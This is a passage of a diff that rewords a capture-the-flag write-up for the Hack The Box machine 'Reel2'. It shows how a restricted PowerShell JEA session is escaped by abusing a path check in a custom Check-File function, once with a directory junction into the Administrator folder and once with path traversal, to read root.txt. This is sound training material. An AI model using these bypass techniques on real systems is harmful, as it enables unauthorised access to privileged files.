+It appeared I'd uncovered a password for the `jea_test_account` referenced by the files I'd seen earlier. I tried logging in the same way I had with `k.svensson`, but authentication failed. Researching how to use PowerShell remoting with JEA, I once again found Microsoft's documentation very helpful.
 
 * [https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1)
 * [https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/using-jea?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/using-jea?view=powershell-7.1)
@@ -927,7 +923,7 @@ It looked like I had found a password for the `jea_test_account` I had seen file
 
 * [https://stackoverflow.com/questions/10011794/hardcode-password-into-powershells-new-pssession](https://stackoverflow.com/questions/10011794/hardcode-password-into-powershells-new-pssession)
 
-In order to pass both the username and password into the `New-PSSession` cmdlet, I had to create a new object that contained this information.
+To feed both the username and password into the `New-PSSession` cmdlet, I had to build a new object holding those credentials.
 
 ### Shell as `jea_test_account`
 
@@ -953,7 +949,7 @@ PS /home/kac0/htb/reel2> $jeaSession = New-PSSession <YOUR_IP> -Credential $cred
 PS /home/kac0/htb/reel2> Enter-PSSession $jeaSession
 ```
 
-After creating an object with the credentials and specifying the connection with the configuration name, I was able to connect.
+Once I'd created the credential object and specified the connection's configuration name, the connection succeeded.
 
 ```text
 [<YOUR_IP>]: P> whoami /all
@@ -969,7 +965,7 @@ The syntax is not supported by this runspace. This can occur if the runspace is 
     + FullyQualifiedErrorId : ScriptsNotAllowed
 ```
 
-I went from one restricted account to a more restricted account.... "no-language mode".
+I'd traded one restricted account for an even more restricted one.... "no-language mode".
 
 * [https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/using-jea?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/using-jea?view=powershell-7.1) 
 
@@ -998,7 +994,7 @@ Cannot find path '' because it does not exist.
     + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetHelpCommand
 ```
 
-I used `Get-Command` to see what commands I had access to, and found that it was pretty much the same list as before with one addition.  I tried to access the help information for the `Check-File` command, but I got a `Cannot find path` error.
+Running `Get-Command` to check my available commands showed nearly the same list as before, plus one new entry. When I tried to pull up help for the `Check-File` command, I got a `Cannot find path` error.
 
 ```bash
 [<YOUR_IP>]: P> .{type jea_test_account.psrc}
@@ -1064,7 +1060,7 @@ FunctionDefinitions = @{
 # AssembliesToLoad = 'System.Web', 'System.OtherAssembly, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
 ```
 
-The answer was in the JEA configuration files I had seen earlier.  Inside the configuration file `jea_test_account.psrc` there was a definition for a custom function `Check-File`. 
+The answer lay in the JEA configuration files I'd come across earlier. The `jea_test_account.psrc` config file defined a custom function called `Check-File`. 
 
 ```bash
 # Functions to define when applied to a session
@@ -1073,7 +1069,7 @@ FunctionDefinitions = @{
     'ScriptBlock' = {param($Path,$ComputerName=$env:COMPUTERNAME) [bool]$Check=$Path -like "D:\*" -or $Path -like "C:\ProgramData\*" ; if($check) {get-content $Path}} }
 ```
 
-This function runs the `Get-Content` cmdlet, but first checks to see if the path of the file supplied contains `D:\` or `C:\ProgramData\`, and only works if this is true. It seems that there must be some file in these directories that would hopefully point me in the right direction.
+This function calls the `Get-Content` cmdlet, but only after verifying the supplied path begins with `D:\` or `C:\ProgramData\`; otherwise it does nothing. That implied there was likely some file in those directories meant to steer me forward.
 
 ```bash
 [<YOUR_IP>]: PS>.{type jea_test_account.pssc}
@@ -1112,7 +1108,7 @@ RoleDefinitions = @{
 LanguageMode = 'NoLanguage'
 ```
 
-The second configuration file confirmed my suspicions that I had been locked into `NoLanguage` mode, which explained why I couldn't use custom functions anymore.
+The second config file confirmed my hunch that I was locked into `NoLanguage` mode, which is why custom functions no longer worked.
 
 ```text
 [<YOUR_IP>]: P> .{cd D:\}
@@ -1124,11 +1120,11 @@ At line:1 char:3
     + FullyQualifiedErrorId : DriveNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
 ```
 
-It did not appear that there even was a `D:\` drive, so I checked out the other folder.
+There didn't appear to be a `D:\` drive at all, so I turned to the other directory.
 
 ### Two paths forward
 
-I did some research on how to use PowerShell to link files and how to mount new drive letters.
+I looked into how to link files and mount new drive letters with PowerShell.
 
 * [https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell](https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell)
 * [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.1)
@@ -1144,7 +1140,7 @@ D                                      FileSystem    C:\
 [<YOUR_IP>]: P> .{cd D:\}
 ```
 
-Using this, I was able to create a `D:\` drive that linked to all of the folders and files in the `C:\` drive.
+With this, I created a `D:\` drive pointing at all the folders and files on the `C:\` drive.
 
 ```text
 [<YOUR_IP>]: P> .{cd D:\Users}
@@ -1162,7 +1158,7 @@ d-----        7/30/2020   1:17 PM                k.svensson
 d-r---        8/22/2013   5:39 PM                Public
 ```
 
-I was able to link the C drive to the D drive letter as the `k.svensson` user, however the `jea_test_account` was not able to see the `D:\` drive I had created.
+As the `k.svensson` user I could map the C drive to the D drive letter, but the `jea_test_account` couldn't see the `D:\` drive I'd created.
 
 * [https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell](https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell)
 
@@ -1178,7 +1174,7 @@ At line:1 char:3
    temCommand
 ```
 
-Instead I tried mounting the `C:\Users\Administrator\` into the other folder listed in the `Check-File` script, `C:\ProgramData\`.  I did not have permissions to link to the `/Administrator` folder directly.
+So instead I attempted to mount `C:\Users\Administrator\` under the other folder allowed by the `Check-File` script, `C:\ProgramData\`. I lacked permission to link directly to the `/Administrator` folder.
 
 ```text
 [<YOUR_IP>]: PS>.{New-Item -Path C:\ProgramData\Desk\ -ItemType Junction -Value C:\Users\Administrator\}                                                                                                   
@@ -1190,7 +1186,7 @@ Mode                LastWriteTime         Length Name
 d----l        2/16/2021  11:19 PM                Desk
 ```
 
-Instead, I created a new folder inside `C:\ProgramData\` called `\Desk` which linked to the admins folder.
+Instead, I made a new folder named `\Desk` inside `C:\ProgramData\` that junctioned to the admin's folder.
 
 ### Root.txt
 
@@ -1199,11 +1195,11 @@ Instead, I created a new folder inside `C:\ProgramData\` called `\Desk` which li
 e145************************dbba
 ```
 
-I was then able to use `Check-File` to read the contents of the `root.txt` by referencing the linked version inside `C:\ProgramData\Desk\Desktop\`.  
+I could then use `Check-File` to read the `root.txt` contents through the linked path at `C:\ProgramData\Desk\Desktop\`.  
 
 ### Route two
 
-After going through all of the trouble to create a link to the folders, I realized that I could also do it much more simply...with directory traversal!
+After all the effort of building links to the folders, I realized there was a far simpler approach...directory traversal!
 
 ```text
 [<YOUR_IP>]: PS>Check-File C:\ProgramData\..\Users\Administrator\Desktop\root.txt
